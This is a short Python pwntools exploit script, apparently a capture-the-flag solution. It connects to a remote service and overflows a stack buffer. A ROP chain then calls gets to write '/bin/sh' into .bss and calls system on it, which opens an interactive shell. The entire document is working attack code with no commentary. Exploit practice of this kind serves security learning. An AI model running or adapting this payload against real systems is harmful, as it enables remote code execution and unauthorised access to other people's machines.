from pwn import*
p = remote('124.156.121.112',28065)
context.log_level ='DEBUG'
elf =ELF('./main')
pop_rdi_ret = 0x04006D3
payload = 'U'*0x20 + 'U'*8 + p64(pop_rdi_ret) + p64(elf.bss()+0x100) + p64(elf.plt['gets'])  + p64(pop_rdi_ret) + p64(elf.bss()+0x100) + p64(elf.plt['system'])
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
